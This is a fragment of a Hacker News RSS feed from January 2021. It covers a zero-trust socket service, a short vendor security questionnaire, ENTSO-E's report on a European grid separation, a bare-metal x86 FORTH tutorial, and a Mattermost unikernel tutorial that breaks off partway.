 <span>-</span>p <span>3000</span><span>:</span><span>3000</span> grafana<span>/</span>grafana</span></pre><div id="viewer-ef9a1"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.mysocket.io/post/introducing-identity-aware-sockets-enabling-zero-trust-access-for-your-private-services" data-pin-media="https://static.wixstatic.com/media/3b930f_63a33419247f443da525a06363fbd946~mv2.png/v1/fit/w_1000%2Ch_1000%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/3b930f_63a33419247f443da525a06363fbd946~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p></div></div></div></div><p id="viewer-9qova"><span>Grafana is now listening on localhost port 3000. The mysocket connection we created earlier is relaying authenticated and authorized traffic to that local socket. With that, we should now be able to test and see if we have access to Grafana.</span></p><h2 id="viewer-7qimt"><span>Wrapping up</span></h2><p id="viewer-7a5k3"><span>In this article, we introduced identity aware sockets. We saw how Mysocket users can easily enable authentication for their HTTP(S) based sockets and how OpenID connect is used for the authentication flow to Google, Facebook, or Github (for now). We then looked at how authorization rules can be added by either matching the email domain or even a list of email addresses.</span></p><p id="viewer-chch1"><span>With this, it’s now easy to provide access to internal applications, from any device, any time anywhere, without the need for a VPN.</span></p></div></div></div></div></article></div></div>]]>
            </description>
            <link>https://www.mysocket.io/post/introducing-identity-aware-sockets-enabling-zero-trust-access-for-your-private-services</link>
            <guid isPermaLink="false">hacker-news-small-sites-25793432</guid>
            <pubDate>Fri, 15 Jan 2021 17:29:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Reddit Meets Twitter for Finance]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25793319">thread link</a>) | @minhhnguyen
<br/>
January 15, 2021 | https://www.sigmafinite.com/all | <a href="https://web.archive.org/web/*/https://www.sigmafinite.com/all">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p><img src="https://www.sigmafinite.com/static/site_pictures/logo-light.jpg"></p><p><small>Copyright 2021 © Sigma Finite Inc</small>
                    <small>London, UK. All rights reserved.</small>
                </p>
            </div></div>]]>
            </description>
            <link>https://www.sigmafinite.com/all</link>
            <guid isPermaLink="false">hacker-news-small-sites-25793319</guid>
            <pubDate>Fri, 15 Jan 2021 17:18:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Our Dumb Security Questionnaire]]>
            </title>
            <description>
<![CDATA[
Score 140 | Comments 71 (<a href="https://news.ycombinator.com/item?id=25793230">thread link</a>) | @zdw
<br/>
January 15, 2021 | https://hangar.tech/posts/our-dsq/ | <a href="https://web.archive.org/web/*/https://hangar.tech/posts/our-dsq/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>Last year, one of our startups needed to buy a SaaS product (case management and workflow software). There were several promising vendors, all with products that looked impressive. Technically, all had the features and APIs we were looking for. However, we had security concerns. We planned on storing extremely sensitive data in this tool, and wanted to understand their security posture before we selected a vendor.</p><p>This a common problem; you’ve probably ran into it yourself. With SaaS software, how do you verify its security? As an industry, our answers are … poor. We have various certifications (PCI, HIPAA/HITECH, FedRAMP, etc), but all too often these are box-ticking exercises with no real security value – just ask <a href="https://www.schneier.com/blog/archives/2020/12/russias-solarwinds-attack.html">SolarWinds</a>.</p><p>So, security teams often end up sending potential vendors a bunch of questions – what Latacora calls a <a href="https://latacora.micro.blog/its-weird-to/">Dumb Security Questionnaire</a>. As the title implies, the practice … isn’t great. Most DSQs are full of questions with no security value (which explains why most security teams don’t actually read the responses!). But unfortunately, they’re also kinda the best we can do. Huge companies might be able to afford real human-powered security audits and convince vendors to allow them, but small startups like ours don’t have a better option than relying on DSQs.</p><p>As Latacora points out, it turns out there isn’t really a ton that you need to ask. As a startup, we’re not looking for our vendor to be Fort Knox; we just need to know that storing data with them is at least as safe as storing it internally. There are a limited number of likely ways that our vendor might get owned; we just need to ask about those few basic things. Latacora ends their post with this:</p><blockquote><p>Someone — and I am not volunteering — should write the DSQ that just nails these basic
things. 10 questions, no diagrams.</p></blockquote><p>Well, we tried; here it is.</p><h3 id="who-this-is-for">Who this is for</h3><p>This questionnaire is designed for smaller, probably early-stage companies who need to evaluate a vendor. It makes some assumptions:</p><ul><li>You have a security person (or team) who can evaluate the answers and is part of the decision-making process. If nobody’s going to read the answers, don’t waste your vendor’s time.</li><li><em>Your</em> answers to these questions are already pretty ok. If not, stop wasting time evaluating vendors. Just buy the thing and use the time you save to get your own house in order.</li><li>This is for some SaaS product that’ll have particularly high security impact - i.e. a breach of the vendor would be a major, potentially company-ending event. If you’re just trying to decide which ticket tracking system to use, again: just buy one and move on.</li><li>You have no particular compliance requirements – so you’re looking purely evaluate security posture, not compliance.</li></ul><h3 id="our-dumb-security-questionnaire">Our Dumb Security Questionnaire</h3><h4 id="1-please-answer-these-questions">(1) Please answer these questions:</h4><ol><li>If you use a cloud provider (GCP/AWS/Azure/etc):<ul><li>describe how credentials are provisioned, managed, and stored.</li><li>If an attacker gained access to an individual developer’s cloud
credentials, what actions could that attacker perform, and how would you
detect and respond to the breach?</li></ul></li><li>If you don’t use a cloud provider: why not?</li><li>Describe how staff authenticate to company services (e.g. servers, email, SaaS
products), particularly highlighting your use of password managers, 2FA, and
SSO.</li><li>What development practices do you use to protect against the OWASP Top 10?</li><li>Describe the steps a developer or operations person takes to push new code to production.</li><li>Have you had any security breaches in the last two years?<ul><li>If yes: please explain the breach, and provide copies of any postmortem/root cause analysis/after-action reports.</li></ul></li></ol><h4 id="2-and-please-provide-as-many-of-the-following-as-possible">(2) And, please provide as many of the following as possible:</h4><ol><li>A recent (last 12 months) penetration test report, with information on what
follow-ups/remediation steps were taken. Reports by an external firm are
preferable; internal tests are OK. A redacted summary is fine as long as it
includes basic vulnerability descriptions and severity levels.</li><li>Documentation on your organization’s Secure Development Lifecycle, or similar, if you
have them. If not, please summarize the steps you take to help engineers write secure
code.</li><li>A copy of any security training material provided to staff, particularly
software developers. A summary/description of classes and content is fine.</li><li>A link to your Vulnerability Disclosure Policy and/or bug bounty program. If you don’t
have either: please explain.</li></ol><p>(10 questions, no diagrams :)</p><h4 id="license">License</h4><p>This questionnaire is <a href="https://creativecommons.org/publicdomain/zero/1.0/">released to the public domain</a>. We’d appreciate it if you credit us if you release a
derivative of this, but do what you like.</p></article></div>]]>
            </description>
            <link>https://hangar.tech/posts/our-dsq/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25793230</guid>
            <pubDate>Fri, 15 Jan 2021 17:13:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[System Separation in the Continental Europe Synchronous Area on 8 January 2021]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25793178">thread link</a>) | @andreasley
<br/>
January 15, 2021 | https://www.entsoe.eu/news/2021/01/15/system-separation-in-the-continental-europe-synchronous-area-on-8-january-2021-update/ | <a href="https://web.archive.org/web/*/https://www.entsoe.eu/news/2021/01/15/system-separation-in-the-continental-europe-synchronous-area-on-8-january-2021-update/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>On 8 January 2021 at 14:05 CET the synchronous area of Continental Europe was separated into two separated areas due to outages of several transmission network elements in a very short time. The route where the two areas were separated is the following:</p><p><img src="https://d33wubrfki0l68.cloudfront.net/e57eb58e915151390602cbb873b8422e952e5837/26de1/assets/graphics/uploads/first-image-mod.jpg" alt="" title="Figure 1 - Map of Continental Europe showing the two separated areas during the system event on 8 January 2021"></p><p><em>Figure 1 - Map of Continental Europe showing the two separated areas during the system event on 8 January 2021</em></p><p>At approximately 14:05 CET, the frequency in the North-West Area of Continental Europe initially decreased to a value of 49.74 Hz within a period of around 15 seconds. Afterwards, the frequency reached a steady state value of approximately 49.84 Hz. At the same time, the frequency in the South-East Area initially increased to a value of up to 50.6 Hz before settling at a steady state frequency between 50.2 Hz and 50.3 Hz. This can also be seen from the graph below.</p><p><img src="https://d33wubrfki0l68.cloudfront.net/af53041f1f9915046a980de1662f685154376b5c/304f8/assets/graphics/uploads/second-image-mod.png" alt="" title="Figure 2 - Frequency in Continental Europe during the event on 8 January 2021"></p><p><em>Figure 2 - Frequency in Continental Europe during the event on 8 January 2021</em></p><p>Due to the underfrequency in the North-West Area, contracted interruptible services in France and Italy, in total around 1.7 GW, were disconnected in order to reduce the frequency deviation. These services are large customers who are contracted by the respective Transmission System Operators (TSOs) disconnected if frequency drops under a certain threshold. In addition, 420 MW and 60 MW of supportive power were automatically activated from the Nordic and Great Britain Synchronous areas respectively. These countermeasures ensured that already at 14:09 CET the frequency deviation was limited to a deviation of around 0.1 Hz in the North-West Area from the nominal frequency of 50 Hz (see Figure 2).</p><p>Due to the large overfrequency in the South-East Area, automatic and manual countermeasures were activated (i.e. the reduction of the feed-in of generation units) in order to stabilise the frequency. Thus, at 15.05 CET the frequency deviation in the South-East Area could be limited to +0.1 Hz from the nominal frequency of 50 Hz (see Figure 2).</p><p>The automatic response and the coordinated actions taken by the TSOs in Continental Europe ensured that the situation was quickly restored to normal operations. Actions were coordinated between the TSOs in order to reconnect the two areas as fast as possible again. Therefore, the contracted interruptible services in Italy could be reconnected at 14:47 CET and in France at 14:48 CET. At 15:08 CET, both areas were connected again to one synchronous area in Continental Europe.</p><p>ENTSO-E has kept the European Commission and the Electricity Coordination Group composed of representatives of Member States informed.</p><p>ENTSO-E is publishing today also questions and answers with regards to this event. All information published is subject to the results of a detailed investigation on the event which is ongoing. The investigation is following the legal framework under the Commission Regulation (EU) 2017/1485 of 2 August 2017 (System Operation Guideline) whereby National Regulatory Authorities and ACER are invited to join together with TSOs in the Investigation Panel.</p><p>In line with the provisions of the Commission Regulation (EU) 2017/1485 of 2 August 2017 (System Operation Guideline), ENTSO-E will present the results of the investigation to the Electricity Coordination Group and will subsequently publish them once the analysis is completed.</p><p><strong><em>Questions and answers</em></strong></p><p><strong>What is a system separation?</strong></p><p>The transmission grids of the countries of Continental Europe are electrically tied together to operate synchronously at the frequency of approximately 50 Hz. An event on 8 January 2021 caused the Continental Europe synchronous area to separate into two areas, with an area in the South-East of Europe being temporarily operating in separation from the rest of Continental Europe.</p><p><strong>Is this the first time such an event happens in Continental Europe?</strong></p><p>The Continental Europe synchronous area is one of the largest interconnected synchronous electricity systems in the world in terms of its size and number of supplied customers. Such a kind of event can happen in any electric power system. System resilience and preparedness of system operators in charge have a decisive impact on the consequences of such events. A separation of the synchronous area with a much larger disturbance and impacts on customers took place in Continental Europe on the 4 November 2006. This event was extensively analysed and led to a number of substantial developments, like the European Awareness System (EAS) which is a platform allowing TSOs to exchange operational information in real time, enabling them to react immediately in case of unusual system condition. The TSOs are therefore well prepared in order to coordinate and manage such events and limit the consequences. This preparedness and a permanent observation of the system frequency allowed to resynchronize the two separated areas in a very short period of time.</p><p><strong>How are countermeasures coordinated in Continental Europe in case of frequency deviations?</strong></p><p>In Continental Europe, procedures are in place to avoid system disturbances and especially large frequency deviations with the risk of uncoordinated disconnection of customers or generation. The TSOs Amprion (Germany) and Swissgrid (Switzerland) are responsible for these procedures in their role as synchronous area monitor (SAM) in Continental Europe. The SAM continuously monitors the system frequency. In case of large frequency deviations, they inform all TSOs via the European Awareness System (EAS) and launch an extraordinary procedure for frequency deviations to coordinate countermeasures in a fast and effective manner in order to stabilize the system. One step of this procedure is a telephone conference by Amprion, Swissgrid, RTE (France), Terna (Italy) and REE (Spain). This teleconference took place at 14:09 CET on 8 January 2021. In the telephone conference, the situation was evaluated, the TSOs informed about countermeasures which were already activated. The TSOs of the North-West and South-East area also coordinated the actions for reconnection in order to reach one synchronous area in Continental Europe again.</p><p><strong>Were end customers disconnected? Were there any other consequences?</strong></p><p>Customers in the order of 70 MW in the North-East Area and in the order of 163 MW in the South-East Area were disconnected. Due to the high resilience of the interconnected network and the rapid response of European TSOs, the security of operation and electricity supply was not endangered. An important contribution to stabilizing the system was delivered by the previously contracted interruptible services, which were activated in France and Italy. Such contracts which have been agreed with customers allow the TSO to temporarily and automatically reduce their electrical consumption depending on the situation with the electric power system in real-time.</p><p><strong>What caused the separation?</strong></p><p>In line with the provisions of the System Operation Guideline, a detailed investigation is ongoing on the event. This includes a comprehensive analysis of large numbers of real-time recordings from protection devices and other electric power system elements. ENTSO-E will publish the results of this investigation as soon as the analysis is finalised.</p><p><strong>Press Contact:</strong> Claire Camus &nbsp;+32 476 975093 claire.camus@entsoe.eu</p></div></div></div></div>]]>
            </description>
            <link>https://www.entsoe.eu/news/2021/01/15/system-separation-in-the-continental-europe-synchronous-area-on-8-january-2021-update/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25793178</guid>
            <pubDate>Fri, 15 Jan 2021 17:09:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bare Metal x86 Forth]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25792694">thread link</a>) | @marksmillibend
<br/>
January 15, 2021 | https://ph1lter.bitbucket.io/blog/2021-01-15-baremetal-x86-forth.html | <a href="https://web.archive.org/web/*/https://ph1lter.bitbucket.io/blog/2021-01-15-baremetal-x86-forth.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

<a href="https://ph1lter.bitbucket.io/index.html">(home)</a> <span>2021-01-15</span><br>
<img src="https://ph1lter.bitbucket.io/img/forth-screenshot.png">
<p>In this post I develop a simple
<a href="http://users.ece.cmu.edu/~koopman/forth/hopl.html">FORTH</a>
system which can be put on a USB stick and will boot on an x86 PC into an interactive
REPL. It's really just the beginning of a self-hosted development environment but it does have the basic ability to accept
keyboard input, display results on screen, execute FORTH words and enter integers.
</p>
<p>I'm exploring the idea of how <em>little</em> assembler we can use to bootstrap an interactive development environment on a new machine.
</p>
<h2> abstraction and portablity</h2>
<p>The less assembler we have to write to bootstrap our system, the less work we have to do to port the system onto another platform.
FORTH allows us to start writing the FORTH system in FORTH itself, long before we have anything as complicated as a self-hosted compiler
or assembler <span>We write forth words using assembler data definitions</span>.
</p>
<p>The aim is to write the minimum amount of assembler possible and start writing FORTH as early as possible. This will certainly not
provide the most speed/size efficient system, but will provide the most portable system.
</p>
<h2> x86 16-bit code</h2>
<p>I am forced to write this system in 16-bit x86 <em>real mode</em> assembler, the assembler of the 8086 processor which lives on in
every intel chip.
</p>
<p>The reason for this is that I want to make use of the BIOS code for accessing screen, keyboard and disk and the PC BIOS
only runs as long as the processor remains in <em>real mode</em>.
</p>
<p>Even if you are familiar with x86 assembler this, restricted machine, may be new to you.
</p>
<p>The system is built using the
<a href="https://nasm.us/"><code>nasm</code></a>
assembler
since it provides an easy way to develop 16-bit, x86 code and generate flat executables suitable for PC boot.
It also provides macros which make things easier.
</p>
<h2> FORTH allows for a very simple VM core</h2>
<p>With just 2 assembly routines, <code>enter</code> and <code>exit</code>, FORTH provides a VM core engine.
One must decide on registers to store the 2 required stacks (data and return) and also the code pointer and then these two routines
provide the engine for all FORTH control flow.
</p>
<p>I'll just assume that you know FORTH is a stack machine and all function/word arguments are passed explicitly on the data stack.
Calling a function/word just uses the name of that word. There is no parameter passing; parameters are expected to be on the stack.
</p>
<p>As usual the full code is linked at the end.
</p>
<h3> FORTH VM briefly described</h3>
<p>I'll try to describe the FORTH VM approach here briefly. Rather than using normal call/ret, FORTH takes control of this explicitly with
a return stack and jumps. FORTH functions (called words) can be seen as a vector of pointers to code (Code Field Addresses/CFA).
The machine's <em>code pointer</em> points at these vectors and jumps to the code pointed at by the vector entries (2 indirection levels).
To move to the next instruction/word/function we just increment the code pointer.
</p>
<p>To call another FORTH word we just point the code pointer to it's CFA vector and push the address of the next CFA so we can return here.
</p>
<p>Eventually we need to call <em>real</em> code. So all CFA's actually point
to assembler and we just jump there. For primitive words, this is fine. For FORTH words there is a special assembler prelude (called ENTER) which
actually does the return stack push, and the change of the code pointer to point to the current word's CFA vector.
<span>So the call is actually handled inside the callee rather than by the caller</span>.
</p>
<p>The <em>end</em> of a CFA vector is just another (primitive) FORTH word called <code>exit</code>. This contains assembler code to pop the
code pointer off the return stack and jump to it, thus continuing from the word after the one calling this word.
</p>
<p>This is a little mind-bending to explain, but the actual code to do it is shorter than even this brief description and is listed below.
</p>
<p>Here's some more info on the <em>threaded code</em> approach.
<a href="http://www.bradrodriguez.com/papers/moving1.htm">http://www.bradrodriguez.com/papers/moving1.htm</a>
</p>
<h3> VM register definitions and code</h3>
<p>I've chosen the following register setup for my code pointer and stacks (the 8086 is very limited, and there is not a lot of choice).
</p>
<ul><li>
register DI is code-pointer
</li><li>
register BP is return stack
</li><li>
register SP is data stack
</li></ul>
<p>I'll define some assembler macros to rename the chosen registers to more FORTH-like names:
</p>
<pre>%define codeptr di
%define rstack bp
%define dstack sp
</pre>
<p>As an example, the top-level function in this system looks like this. It begins with the <code>enter</code> prelude macro
and is then just a list of pointers to assembly code blocks, the final one being <code>exit</code>.
</p>
<pre>main:
  enter
  dw cls, lit, str_welcome, puts, interpret, exit
</pre>
<p>Here are the <code>enter</code> and <code>exit</code> macros which provide the VM code I need to inline in other places.
</p>
<p>Note that non-FORTH, primitive words don't actually use the return stack. They don't start with the <code>enter</code>
code and have their own <code>primexit</code> code at the end.
</p>
<pre>;; this asm code is inlined at the start of every forth word to setup the
;; code pointer to point at the start of the CFA vector
%define entry_code_len 18 ; must be updated if macro enter is changed
%macro enter 0
  rpush
  mov codeptr, [codeptr] ; code-pointer = this word's ENTER code
  add codeptr, entry_code_len ; offset code-pointer to just after ENTER code i.e. start of cfa vector
  next ; run first cfa in this word's cfa vector
%endmacro
;; this asm code is inlined at the end of every primitive/pure asm word
;; to continue executing with the next CFA in the vector
%macro primexit 0
  add codeptr, 2 ; move code-pointer to next cfa vector entry
  next
%endmacro
;; forth primitive used to exit forth words
exit:
  rpop
  next
</pre>
<p>Some other helper macros used above:
</p>
<pre>;; execute next word
%macro next 0
  jmp [codeptr]
%endmacro
;; push to return stack for forth word call
%macro rpush 0
  mov dx, codeptr
  add dx, 2
  sub rstack, 2
  mov word [rstack], dx
%endmacro
;; pop from return stack to resume after word call
%macro rpop 0
  mov codeptr, [rstack]
  add rstack, 2
%endmacro
</pre>
<h3> loops</h3>
<p>To write useful code we need loops. I've decided to use the tail-call approach to loops. <code>loop</code> allows a FORTH word
to return to its beginning and that's enough to implement loops. We find the current word's beginning (it's CFA vector)
by cheating. We look at the entry on the return stack. It points just after the word calling this one. If we step back
we can get the CFA for this word. Then we just skip the entry prelude assembler code and have a pointer to the CFA
vector for this word. We jump there and we have looped. Simple!
</p>
<pre>loop:
  ; jump back to start of current function (tail call)
  mov codeptr, [rstack] ; rpeek
  sub codeptr, 2
  mov codeptr, [codeptr] ; current word entry
  add codeptr, entry_code_len ; skip entry prelude to cfa vec
  next
</pre>
<h3> conditional branches</h3>
<p>Conditional exit is like normal exit at the end of a word (in fact exit can be used anywhere
in a word) but it only happens if the value popped off the stack is zero. Again this is enough to implement if/then/else and
while loops. You just need to make a separate word for each IF statement and exit early to avoid the body of the IF.
</p>
<pre>zexit:
  pop ax
  cmp ax, 0
  jnz .donothing
  rpop ; exit
  next
.donothing:
  primexit
</pre>
<p>In fact I initially just had conditional exit, but I later added a conditional jump which adds an offset to the code pointer if
the stack top is zero. It requires manually counting the offset from after the instruction to the next instruction and changing
that every time the intervening code changes length.
<span>a FORTH compiler would handle this automatically by providing an if/then/else construct.</span>
</p>
<pre>zjump:
  add codeptr, 2
  pop ax
  cmp ax, 0
  jnz .donothing
  add codeptr, [codeptr]
.donothing:
  primexit
</pre>
<p>Here's an example use of an unconditional <code>jump</code> instead of loop and a variant of <code>zexit</code>.
</p>
<pre>puts:
  enter
  dw dup, cfetch, zexitkeep, emit, inc, jump, -7*2, exit
</pre>
<h3> literals</h3>
<p>Since CFA vectors just have code addresses how do we get numbers/addresses on the data stack? There is a special primitive word
called <code>lit</code> which takes the next CFA in the vector, pushes it on the data stack and skips it (since it's not really a CFA).
</p>
<pre>lit:
  add codeptr, 2
  mov ax, [codeptr]
  push ax
  primexit
</pre>
<h2> Machine IO</h2>
<p>The only things we need to create a minimal, self-hosted, development environment on a platform are
</p>
<ul><li>
screen character output (think terminal)
</li><li>
keyboard input
</li><li>
basic disk access (for loading and saving text files)
</li></ul>
<p>The x86 BIOS provides reasonably simple interfaces to these which makes developing this system easier than for other platforms
(see discussion of ARM systems below).
</p>
<p>I started off proving that I can get the screen and keyboard working. With the eventual goal of having some kind of interactive REPL.
</p>
<p>Here we see <code>main</code>, the top-level entry word for the system. It's actually written in FORTH not assembler.
</p>
<ul><li>
First we have the <code>enter</code> macro (which adds in the assembler to make a block of code behave as a FORTH word).
</li><li>
Next we have the CFA vector, which is a list of CFA's (code addresses). This vector is
created using the NASM pseudo op <code>dw</code> (define word) which creates a list of inlined 16-bit constants. Each of these is the address of
an assembler routine. We also see <code>exit</code> at the end which is an assembler routine that knows how to return from a FORTH word.
</li></ul>
<p><span>Actually main is not allowed to return, and interpret is a loop.</span>
</p>
<pre>main:
  enter
  dw cls, lit, str_welcome, puts, interpret, exit
</pre>
<p>In <em>real FORTH</em> this would look something like this:
</p>
<pre>: main cls ." Welcome to FORTH!" interpret ;
</pre>
<p><span>where ." is a magical compiler immediate which puts the following string somewhere in memory and compiles in [lit, addr, puts] instead</span>
</p>
<h3> screen output</h3>
<p>The FORTH word <code>emit</code> puts a single character on screen and updates the cursor position for the next character.
We can build more complicated string output words on that basis.
</p>
<p>Here is the underlying bios call for character output and the FORTH word emit which calls it and keeps track of the cursor update.
I don't include the cursor update code since it's a bit involved. It uses conditionals to check overflow
and a global to keep the cursor position (see code linked at end).
</p>
<pre>;…</pre></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ph1lter.bitbucket.io/blog/2021-01-15-baremetal-x86-forth.html">https://ph1lter.bitbucket.io/blog/2021-01-15-baremetal-x86-forth.html</a></em></p>]]>
            </description>
            <link>https://ph1lter.bitbucket.io/blog/2021-01-15-baremetal-x86-forth.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25792694</guid>
            <pubDate>Fri, 15 Jan 2021 16:35:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Running MatterMost as a Unikernel]]>
            </title>
            <description>
<![CDATA[
Score 23 | Comments 7 (<a href="https://news.ycombinator.com/item?id=25792618">thread link</a>) | @eyberg
<br/>
January 15, 2021 | https://nanovms.com/dev/tutorials/running-mattermost-as-unikernel | <a href="https://web.archive.org/web/*/https://nanovms.com/dev/tutorials/running-mattermost-as-unikernel">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

                <p>Mattermost is an open source, private cloud slack
alternative written in Go and React. It has many integrations and can
can connect to mysql or postgres for persistence. While there are many
"hello world" tutorials out there for running the Nanos unikernel we
thought this would be a nice little example to showcase two things:</p>

<p>1) How to run a multi-node setup. Most web applications are more than
just one actual application - the canonical example would be a webapp
server and its corresponding database.</p>
<p>2) How to interact with taps and bridges for a faster networking
experience or if you wanted to build your own private cloud. (Creating taps,
today, will only work on Linux as the tuntaposx package does not work
anymore but we're looking at alternatives.)</p>

<p>Ready? Let's get started.</p>

                <h3>Running mysql as a Nanos unikernel</h3>

                <p>We start by running the mysql server as a unikernel.
We've created a convenient package to use and the only thing you need to
do is set your base volume size. You could create an external volume but
we'll leave that to a different article.</p>

<pre><code>{
  "BaseVolumeSz": "400m"
}
</code></pre>

<p>Now let's run mysql by creating a tap device and assigning it a
static ip:</p>

                <pre><code>➜  mysql ops load mysql_5.7.29 -c config.json -p 3306 -b -t tap0 --ip-address 192.168.42.19
[mysqld --user=root --explicit_defaults_for_timestamp]
booting /home/eyberg/.ops/images/mysqld.img ...
assigned: 192.168.42.19
2021-01-11T17:45:54.942930Z 0 [Warning] The syntax '--log_warnings/-W' is deprecated and will be removed in a future release. Please use '--log_error_verbosity' instead.
2021-01-11T17:45:54.945335Z 0 [Warning] Insecure configuration for --secure-file-priv: Location is accessible to all OS users. Consider choosing a different directory.
2021-01-11T17:45:54.945564Z 0 [Note] mysqld (mysqld 5.7.29-0ubuntu0.18.04.1-log) starting as process 2 ...
2021-01-11T17:45:54.957853Z 0 [Note] InnoDB: PUNCH HOLE support available
2021-01-11T17:45:54.959551Z 0 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins
2021-01-11T17:45:54.961557Z 0 [Note] InnoDB: Uses event mutexes
2021-01-11T17:45:54.962979Z 0 [Note] InnoDB: GCC builtin __atomic_thread_fence() is used for memory barrier
2021-01-11T17:45:54.965371Z 0 [Note] InnoDB: Compressed tables use zlib 1.2.11
2021-01-11T17:45:54.967107Z 0 [Note] InnoDB: Using Linux native AIO
2021-01-11T17:45:54.968929Z 0 [Note] InnoDB: Number of pools: 1
2021-01-11T17:45:54.970498Z 0 [Note] InnoDB: Using CPU crc32 instructions
2021-01-11T17:45:54.974749Z 0 [Note] InnoDB: Initializing buffer pool, total size = 128M, instances = 1, chunk size = 128M
2021-01-11T17:45:54.985275Z 0 [Note] InnoDB: Completed initialization of buffer pool
2021-01-11T17:45:54.989751Z 0 [Note] InnoDB: If the mysqld execution user is authorized, page cleaner thread priority can be changed. See the man page of setpriority().
2021-01-11T17:45:55.008773Z 0 [Note] InnoDB: Highest supported file format is Barracuda.
2021-01-11T17:45:55.024639Z 0 [Note] InnoDB: Creating shared tablespace for temporary tables
2021-01-11T17:45:55.026961Z 0 [Note] InnoDB: Setting file './ibtmp1' size to 12 MB. Physically writing the file full; Please wait ...
2021-01-11T17:45:55.062911Z 0 [Note] InnoDB: File './ibtmp1' size is now 12 MB.
2021-01-11T17:45:55.065453Z 0 [Note] InnoDB: 96 redo rollback segment(s) found. 96 redo rollback segment(s) are active.
2021-01-11T17:45:55.068301Z 0 [Note] InnoDB: 32 non-redo rollback segment(s) are active.
2021-01-11T17:45:55.070845Z 0 [Note] InnoDB: 5.7.29 started; log sequence number 2631215
2021-01-11T17:45:55.073134Z 0 [Note] InnoDB: Loading buffer pool(s) from /var/lib/mysql/ib_buffer_pool
2021-01-11T17:45:55.075770Z 0 [Note] Plugin 'FEDERATED' is disabled.
2021-01-11T17:45:55.086078Z 0 [Note] InnoDB: Buffer pool(s) load completed at 210111 17:45:55
2021-01-11T17:45:55.097471Z 0 [Note] Found ca.pem, server-cert.pem and server-key.pem in data directory. Trying to enable SSL support using them.
2021-01-11T17:45:55.100836Z 0 [Note] Skipping generation of SSL certificates as certificate files are present in data directory.
2021-01-11T17:45:55.105239Z 0 [Warning] CA certificate ca.pem is self signed.
2021-01-11T17:45:55.107312Z 0 [Note] Skipping generation of RSA key pair as key files are present in data directory.
2021-01-11T17:45:55.110568Z 0 [Note] Server hostname (bind-address): '0.0.0.0'; port: 3306
2021-01-11T17:45:55.112817Z 0 [Note]   - '0.0.0.0' resolves to '0.0.0.0';
2021-01-11T17:45:55.114596Z 0 [Note] Server socket created on IP: '0.0.0.0'.
2021-01-11T17:45:55.116577Z 0 [Warning] Insecure configuration for --pid-file: Location '/var/lib/mysql' in the path is accessible to all OS users. Consider choosing a different directory.
2021-01-11T17:45:55.136775Z 0 [Note] Event Scheduler: Loaded 0 events
2021-01-11T17:45:55.138651Z 0 [Note] mysqld: ready for connections.
Version: '5.7.29-0ubuntu0.18.04.1-log'  socket: '/var/run/mysqld/mysqld.sock'  port: 3306  (Ubuntu)
</code></pre>

<p>We should be able to connect to the server and create a mattermost
database:</p>

                <pre><code>mysql -u root -h 192.168.42.19
create datbase mattermost;</code></pre>

<p>Ops load by default will re-build the image each time so if you want
to skip that you can pass the '-s' flag or use 'ops instance create' instead.</p>

                <h3>Running MatterMost as a Unikernel</h3>

<p>For mattermost we'll want to edit the mattermost config.json (not to
be confused with the config.json we use for ops). Create a 'config'
directory to store it in. Copy the config.json in. If you want, you can
untar the tarball found in ~/.ops/packages/mattermost_5.12.0.tar.gz and grab a
copy there. Then you'll want to edit the mysql "DataSource" line in
config.json to modify the ip address and l/p:</p>

<pre><code>"DataSource": "root:root@tcp(192.168.42.19:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
</code></pre>

<p>Obviously this is just for demo purposes but as a side note - if you
do accidently deploy this to a public ip with default credentials the
bots that scour the internet looking for these things will be able to
connect and write all the SQL their little bot hearts desire, but their
db encryption operations fail, the cryptojacking
fails, and all the C&amp;C stuff fails. It just shows you how interesting
this style of architecture truly is.</p>

<p>Now let's load up mattermost and give it it's own tap and assign it a static ip address:</p>

                <pre><code>➜ ops load mattermost_5.12.0 -c config.json -p 8065 -b -t tap1 --ip-address 192.168.42.20
warning: overwriting existing file /config/config.json hostpath old: /home/eyberg/.ops/.staging/mattermost_5.12.0/sysroot/config/config.json new: config/config.json
[mattermost -c config/config.json --disableconfigwatch]
booting /home/eyberg/.ops/images/mattermost.img ...
assigned: 192.168.42.20
{"level":"info","ts":1610387180.047103,"caller":"utils/i18n.go:83","msg":"Loaded system translations for 'en' from '/i18n/en.json'"}
{"level":"info","ts":1610387180.0498981,"caller":"app/server_app_adapters.go:58","msg":"Server is initializing..."}
{"level":"error","ts":1610387180.0560362,"caller":"app/server_app_adapters.go:69","msg":"Failed to parse server templates function not implemented"}
{"level":"info","ts":1610387180.0593297,"caller":"sqlstore/supplier.go:224","msg":"Pinging SQL master database"}
{"level":"info","ts":1610387180.231293,"caller":"sqlstore/upgrade.go:104","msg":"The database schema has been set to version 5.12.0"}
{"level":"error","ts":1610387204.4853191,"caller":"app/server_app_adapters.go:125","msg":"SiteURL must be set. Some features will operate incorrectly if the SiteURL is not set. See documentation for details: http://about.mattermost.com/default-site-url"}
